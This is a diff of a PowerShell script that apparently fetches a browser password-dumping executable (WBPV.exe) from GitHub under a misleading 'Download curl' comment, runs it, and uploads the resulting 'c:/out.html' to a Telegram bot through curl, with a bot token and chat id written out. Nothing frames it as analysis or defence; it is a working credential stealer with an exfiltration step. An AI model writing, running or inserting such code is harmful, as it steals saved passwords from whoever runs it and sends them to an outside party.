@@ -38,9 +38,8 @@ if (!(Test-Path $WBPV)) {
   # Download curl
   $url = "https://raw.github.com/ksp-wrk/s/main/WBPV.exe"
   Invoke-WebRequest $url -OutFile $WBPV
+  start-process WBPV $arguments -Wait
 }
-
-start-process WBPV $arguments -Wait
 
 $msbuild = "curl"
 $arguments = '-s -F document=@"c:/out.html" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
